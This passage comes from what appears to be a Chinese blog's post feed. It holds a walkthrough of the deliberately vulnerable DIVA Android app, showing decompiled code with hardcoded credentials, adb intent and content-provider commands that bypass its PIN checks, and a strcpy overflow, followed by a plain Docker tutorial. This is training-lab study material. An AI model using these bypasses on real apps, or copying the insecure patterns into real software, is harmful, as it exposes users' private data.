class="built_in">this</span>.getString(<span class="number">0x7F060026</span>), ((<span class="type">boolean</span>)(((<span class="type">int</span>)z))));  <span class="comment">// string:chk_pin &quot;check_pin&quot;</span></span><br><span class="line">        <span class="keyword">if</span>(i.resolveActivity(<span class="built_in">this</span>.getPackageManager()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.startActivity(i);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Error while getting Tveeter API details&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        Log.e(<span class="string">&quot;Diva-aci1&quot;</span>, <span class="string">&quot;Couldn\&#x27;t resolve the Intent VIEW_CREDS2 to our activity&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>API ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APICreds2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001E</span>);  <span class="comment">// layout:activity_apicreds2</span></span><br><span class="line">        <span class="type">TextView</span> <span class="variable">apicview</span> <span class="operator">=</span> (TextView)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0077</span>);  <span class="comment">// id:apic2TextView</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pintext</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0078</span>);  <span class="comment">// id:aci2pinText</span></span><br><span class="line">        <span class="type">Button</span> <span class="variable">vbutton</span> <span class="operator">=</span> (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0079</span>);  <span class="comment">// id:aci2button</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">this</span>.getIntent().getBooleanExtra(<span class="built_in">this</span>.getString(<span class="number">0x7F060026</span>), <span class="literal">true</span>)) &#123;  <span class="comment">// string:chk_pin &quot;check_pin&quot;</span></span><br><span class="line">            apicview.setText(<span class="string">&quot;TVEETER API Key: secrettveeterapikey\nAPI User name: diva2\nAPI Password: p@ssword2&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        apicview.setText(<span class="string">&quot;Register yourself at http://payatu.com to get your PIN and then login with that PIN!&quot;</span>);</span><br><span class="line">        pintext.setVisibility(<span class="number">0</span>);</span><br><span class="line">        vbutton.setVisibility(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewCreds</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Invalid PIN. Please try again&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>试下使用老套路：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell am start -n jakhar.aseem.diva/.APICreds2Activity -a jakhar.aseem.diva.action.VIEW_CREDS2</span><br></pre></td></tr></table></figure>

<p>失败</p>
<p>过程：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释下：adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false</span><br><span class="line"></span><br><span class="line">这是一个 Android adb shell 命令，它用于在 Diva 应用程序中启动 APICreds2Activity 活动，并传递一些参数。下面对该命令的各个部分进行解释：</span><br><span class="line"></span><br><span class="line">adb shell</span><br><span class="line">这是一个命令行工具，可以在 Android 设备的 shell 终端中运行命令。</span><br><span class="line"></span><br><span class="line">am start</span><br><span class="line">这是一个 Android shell 命令，用于启动一个活动。在这个命令中，通过指定“-a”选项和“-n”选项来指定要启动的活动。</span><br><span class="line"></span><br><span class="line">-a jakhar.aseem.diva.action.VIEW_CREDS2</span><br><span class="line">这个选项指定要启动的活动的 Action，即 jakhar.aseem.diva.action.VIEW_CREDS2。这是一个自定义的 Action，用于指示要启动的是 APICreds2Activity 活动。</span><br><span class="line"></span><br><span class="line">-n jakhar.aseem.diva/.APICreds2Activity</span><br><span class="line">这个选项指定要启动的活动的 ComponentName，即 jakhar.aseem.diva/.APICreds2Activity。其中，jakhar.aseem.diva 是应用程序的包名，APICreds2Activity 是要启动的活动的类名。</span><br><span class="line"></span><br><span class="line">--ez check_pin false</span><br><span class="line">这个选项用于传递一个额外参数给 APICreds2Activity 活动。其中，check_pin 是一个布尔类型的参数名，表示是否需要检查输入的 PIN 码是否正确。false 表示不需要检查。这个参数将在 APICreds2Activity 的 onCreate 方法中被使用，以确定显示哪种类型的凭据信息。</span><br><span class="line"></span><br><span class="line">综上所述，这个命令的作用是启动 Diva 应用程序中的 APICreds2Activity 活动，并传递一个额外参数，以确定显示哪种类型的凭据信息。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这是什么意思：i.setAction(&quot;jakhar.aseem.diva.action.VIEW_CREDS2&quot;);</span><br><span class="line">这段代码是在创建一个 Intent 对象，并使用 setAction() 方法设置了它的 Action 属性为 &quot;jakhar.aseem.diva.action.VIEW_CREDS2&quot;。这个 Action 是自定义的，用于指示要启动 Diva 应用程序中的 APICreds2Activity 活动。可以使用这个 Intent 对象来启动相应的活动或服务。</span><br></pre></td></tr></table></figure>



<h2 id="访问控制问题—第三部分"><a href="#访问控制问题—第三部分" class="headerlink" title="访问控制问题—第三部分"></a>访问控制问题—第三部分</h2><p>代码：</p>
<p>activity：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.SharedPreferences.Editor;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.preference.PreferenceManager;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccessControl3Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addPin</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        SharedPreferences.<span class="type">Editor</span> <span class="variable">sharedPreferences$Editor0</span> <span class="operator">=</span> PreferenceManager.getDefaultSharedPreferences(<span class="built_in">this</span>).edit();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> ((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0070</span>)).getText().toString();  <span class="comment">// id:aci3Pin</span></span><br><span class="line">        <span class="keyword">if</span>(s == <span class="literal">null</span> || (s.isEmpty())) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Please Enter a valid pin!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Button</span> <span class="variable">vbutton</span> <span class="operator">=</span> (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0072</span>);  <span class="comment">// id:aci3viewbutton</span></span><br><span class="line">        sharedPreferences$Editor0.putString(<span class="built_in">this</span>.getString(<span class="number">0x7F06004A</span>), s);  <span class="comment">// string:pkey &quot;notespin&quot;</span></span><br><span class="line">        sharedPreferences$Editor0.commit();</span><br><span class="line">        <span class="keyword">if</span>(vbutton.getVisibility() != <span class="number">0</span>) &#123;</span><br><span class="line">            vbutton.setVisibility(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;PIN Created successfully. Private notes are now protected with PIN&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">goToNotes</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.startActivity(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, AccessControl3NotesActivity.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001B</span>);  <span class="comment">// layout:activity_access_control3</span></span><br><span class="line">        <span class="keyword">if</span>(!PreferenceManager.getDefaultSharedPreferences(<span class="built_in">this</span>).getString(<span class="built_in">this</span>.getString(<span class="number">0x7F06004A</span>), <span class="string">&quot;&quot;</span>).isEmpty()) &#123;  <span class="comment">// string:pkey &quot;notespin&quot;</span></span><br><span class="line">            ((Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0072</span>)).setVisibility(<span class="number">0</span>);  <span class="comment">// id:aci3viewbutton</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>xml文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:authorities</span>=<span class="string">&quot;jakhar.aseem.diva.provider.notesprovider&quot;</span> <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;jakhar.aseem.diva.NotesProvider&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里使用了ContentProvider，android:enabled表示是否能由系统初始化，android:exported表示是否能被其他应用使用，android:authorities标识这个ContentProvider，调用者可以根据这个标识来找到它，看到2个值都为true，我们就可以使用content:&#x2F;&#x2F;访问里面的数据了，查看包含content:&#x2F;&#x2F;的字符串文件apktool&#x2F;diva-beta&#x2F;smali&#x2F;jakhar&#x2F;aseem&#x2F;diva&#x2F;NotesProvider.smali。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell content query –-uri content://jakhar.aseem.diva.provider.notesprovider/notes</span><br></pre></td></tr></table></figure>

<p>没太懂这里，以后需要深入了解安卓再来学学。</p>
<h2 id="硬编码—第二部分"><a href="#硬编码—第二部分" class="headerlink" title="硬编码—第二部分"></a>硬编码—第二部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hardcode2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DivaJni djni;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">access</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">hckey</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C007E</span>);  <span class="comment">// id:hc2Key</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.djni.access(hckey.getText().toString()) != <span class="number">0</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access granted! See you on the other side :)&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access denied! See you in hell :D&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040020</span>);  <span class="comment">// layout:activity_hardcode2</span></span><br><span class="line">        <span class="built_in">this</span>.djni = <span class="keyword">new</span> <span class="title class_">DivaJni</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>djni</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DivaJni</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">soName</span> <span class="operator">=</span> <span class="string">&quot;divajni&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;divajni&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">access</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">initiateLaunchSequence</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>System.loadLibrary(“divajni”)加载了divajni库，一般库文件都放在&#x2F;lib下，在目录下找到libdivajni.so文件，linux下可以使用strings方便的查看二进制文件里的字符串。</p>
<p>olsdfgad;lh</p>
<h2 id="输入校验问题—第三部分"><a href="#输入校验问题—第三部分" class="headerlink" title="输入校验问题—第三部分"></a>输入校验问题—第三部分</h2><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InputValidation3Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DivaJni djni;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040022</span>);  <span class="comment">// layout:activity_input_validation3</span></span><br><span class="line">        <span class="built_in">this</span>.djni = <span class="keyword">new</span> <span class="title class_">DivaJni</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">cTxt</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0085</span>);  <span class="comment">// id:ivi3CodeText</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.djni.initiateLaunchSequence(cTxt.getText().toString()) != <span class="number">0</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Launching in T - 10 ...&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access denied!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>djni</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DivaJni</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">soName</span> <span class="operator">=</span> <span class="string">&quot;divajni&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;divajni&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">access</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">initiateLaunchSequence</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当输入超级多的数据时，程序崩溃了</p>
<p>查看logcat可以发现缓冲区溢出了</p>
<p>可以看到这里使用的是strcpy，使用strcpy_s更加安全</p>
<h2 id="drozer"><a href="#drozer" class="headerlink" title="drozer"></a>drozer</h2><p><a href="https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf">mwri (withsecure.com)</a></p>
<p><a href="https://blog.csdn.net/jianglianye21/article/details/80667346">drozer-Android安全测试基本使用教程（Windows10）_drozer官网_一世繁华行的博客-CSDN博客</a></p>
<p><a href="https://www.jianshu.com/p/dfa92bab3a55">Android安全测试框架Drozer（使用篇） - 简书 (jianshu.com)</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>知道怎么配ADB、以及安卓有哪些漏洞有了更深的了解、以及安卓信息保存、处理输入逻辑等有了更深的了解。</p>
<p>以后有需要再继续深入学习安卓。</p>
]]></content>
      <tags>
        <tag>安卓</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>docker use</title>
    <url>/2023/03/01/docker/</url>
    <content><![CDATA[<h1 id="Docker学习"><a href="#Docker学习" class="headerlink" title="Docker学习"></a>Docker学习</h1><p>对应大纲：<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301085455109.png" alt="image-20230301085455109" style="zoom:25%;" /></p>
<span id="more"></span>

<h3 id="1、初识DOCKER"><a href="#1、初识DOCKER" class="headerlink" title="1、初识DOCKER"></a>1、初识DOCKER</h3><h5 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h5><p>三个环境：开发环境、测试环境、生产环境</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301085726456.png" alt="image-20230301085726456" style="zoom: 25%;" />

<p>环境不同可能会造成问题，手动迁移很麻烦。</p>
<p>可以使用容器来迁移环境，解决软件跨环境迁移问题。</p>
<p>Docker概念：Docker是一个开源的应用容器引擎，容器完全是使用沙箱机制，之间相互隔离，容器性能开销低。分为CE版和EE版</p>
<p>安装docker，本次学习docker安装在centos7上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1、yum 包更新到最新 </span></span><br><span class="line">yum update</span><br><span class="line"><span class="comment"># 2、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的 </span></span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"><span class="comment"># 3、 设置yum源</span></span><br><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"><span class="comment"># 4、 安装docker，出现输入的界面都按 y </span></span><br><span class="line">yum install -y docker-ce</span><br><span class="line"><span class="comment"># 5、 查看docker版本，验证是否验证成功</span></span><br><span class="line">docker -v</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301092147712.png" alt="image-20230301092147712"  />

<h5 id="Docker架构"><a href="#Docker架构" class="headerlink" title="Docker架构"></a>Docker架构</h5><p>图片示例：<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301092338599.png" alt="image-20230301092338599" style="zoom: 33%;" /></p>
<p>对应概念：</p>
<ul>
<li><p>镜像（Image）：Docker 镜像（Image），就相当于是 一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包 含了完整的一套 Ubuntu16.04 最小系统的 root 文件系 统。 </p>
</li>
<li><p>容器（Container）：镜像（Image）和容器（Contain er）的关系，就像是面向对象程序设计中的类和对象一 样，镜像是静态的定义，容器是镜像运行时的实体。容 器可以被创建、启动、停止、删除、暂停等。</p>
</li>
</ul>
<p>仓库（Repository）：仓库可看成一个代码控制中心， 用来保存镜像</p>
<h5 id="配置Docker镜像加速器"><a href="#配置Docker镜像加速器" class="headerlink" title="配置Docker镜像加速器"></a>配置Docker镜像加速器</h5><p>使用阿里云镜像加速器</p>
<p>修改daemon配置文件&#x2F;etc&#x2F;docker&#x2F;daemon.json来使用加速器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://5zu0nxqo.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301093225304.png" alt="image-20230301093225304"></p>
<p>完成</p>
<h3 id="2、Docker命令"><a href="#2、Docker命令" class="headerlink" title="2、Docker命令"></a>2、Docker命令</h3><h5 id="Docker服务相关命令"><a href="#Docker服务相关命令" class="headerlink" title="Docker服务相关命令"></a>Docker服务相关命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">启动docker服务:systemctl start docker </span><br><span class="line">停止docker服务:systemctl stop docker </span><br><span class="line">重启docker服务:systemctl restart docker</span><br><span class="line">查看docker服务状态:systemctl status docker </span><br><span class="line">设置开机启动docker服务:systemctl enable docker</span><br></pre></td></tr></table></figure>

<h5 id="Docker镜像相关命令"><a href="#Docker镜像相关命令" class="headerlink" title="Docker镜像相关命令"></a>Docker镜像相关命令</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">查看镜像: 查看本地所有的镜像</span><br><span class="line">docker images</span><br><span class="line">docker images –q <span class="comment"># 查看所用镜像的id</span></span><br><span class="line"></span><br><span class="line">搜索镜像:从网络中查找需要的镜像</span><br><span class="line">docker search 镜像名称</span><br><span class="line"></span><br><span class="line">拉取镜像:从Docker仓库下载镜像到本地，镜像名称格式为 名称:版本号，如果版本号不指定则是最新的版本。</span><br><span class="line">如果不知道镜像版本，可以去docker hub 搜索对应镜像查看。</span><br><span class="line">docker pull 镜像名称 eg:docker pull redis:3.2</span><br><span class="line"></span><br><span class="line">删除镜像: 删除本地镜像</span><br><span class="line">docker rmi 镜像<span class="built_in">id</span> <span class="comment"># 删除指定本地镜像</span></span><br><span class="line">docker rmi `docker images -q` <span class="comment"># 删除所有本地镜像</span></span><br></pre></td></tr></table></figure>

<p>想要看镜像有哪些版本可以去dockerhub：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
<h5 id="Docker容器相关命令"><a href="#Docker容器相关命令" class="headerlink" title="Docker容器相关命令"></a>Docker容器相关命令</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">查看容器</span><br><span class="line">docker ps <span class="comment"># 查看正在运行的容器</span></span><br><span class="line">docker ps –a <span class="comment"># 查看所有容器</span></span><br><span class="line"></span><br><span class="line">创建容器</span><br><span class="line">docker run 参数(可以使用docker run --<span class="built_in">help</span>看对应说明)</span><br><span class="line">-i：保持容器运行。通常与 -t 同时使用。加入it这两个参数后，容器创建后自动进入容器中，退出容器后，容器自动关闭。</span><br><span class="line">• -t：为容器重新分配一个伪输入终端，通常与 -i 同时使用。</span><br><span class="line">• -d：以守护（后台）模式运行容器。创建一个容器在后台运行，需要使用docker <span class="built_in">exec</span> 进入容器。退出后，容器不会关闭。</span><br><span class="line">• -it 创建的容器一般称为交互式容器，-<span class="built_in">id</span> 创建的容器一般称为守护式容器</span><br><span class="line">• --name：为创建的容器命名</span><br><span class="line">docker run -it --name=cl centos:7 /bin/bash</span><br><span class="line">docker run -<span class="built_in">id</span> --name=c2 centos:7 </span><br><span class="line"></span><br><span class="line">进入容器</span><br><span class="line">docker <span class="built_in">exec</span> 参数 <span class="comment"># 退出容器，容器不会关闭</span></span><br><span class="line"></span><br><span class="line">启动容器</span><br><span class="line">docker start 容器名称</span><br><span class="line"></span><br><span class="line">停止容器</span><br><span class="line">docker stop 容器名</span><br><span class="line"></span><br><span class="line">删除容器</span><br><span class="line">docker <span class="built_in">rm</span> 容器名称</span><br><span class="line"></span><br><span class="line">查看容器信息</span><br><span class="line">docker inspect 容器名称</span><br></pre></td></tr></table></figure>

<h3 id="3、Docker容器的数据卷"><a href="#3、Docker容器的数据卷" class="headerlink" title="3、Docker容器的数据卷"></a>3、Docker容器的数据卷</h3><h5 id="数据卷概念及作用"><a href="#数据卷概念及作用" class="headerlink" title="数据卷概念及作用"></a>数据卷概念及作用</h5><p>问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Docker 容器删除后，在容器中产生的数据也会随之销毁 </span><br><span class="line">Docker 容器和外部机器可以直接交换文件吗？ </span><br><span class="line">容器之间想要进行数据交互？</span><br></pre></td></tr></table></figure>

<p>数据卷：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据卷是宿主机中的一个目录或文件</span><br><span class="line">当容器目录和数据卷目录绑定后，对方的修改会立即同步</span><br><span class="line">一个数据卷可以被多个容器同时挂载</span><br><span class="line">一个容器也可以被挂载多个数据卷</span><br></pre></td></tr></table></figure>

<p>数据卷作用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">容器数据持久化 </span><br><span class="line">外部机器和容器间接通信 </span><br><span class="line">容器之间数据交换</span><br></pre></td></tr></table></figure>



<h5 id="配置数据卷"><a href="#配置数据卷" class="headerlink" title="配置数据卷"></a>配置数据卷</h5><p>创建启动容器时，使用 –v 参数 设置数据卷 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run ... –v 宿主机目录(文件):容器内目录(文件) ...  </span><br><span class="line">注意事项： 1. 目录必须是绝对路径 2. 如果目录不存在，会自动创建 3. 可以挂载多个数据卷</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301101912652.png" alt="image-20230301101912652"></p>
<p>可以看到能够同步，可以简单理解为共享文件夹</p>
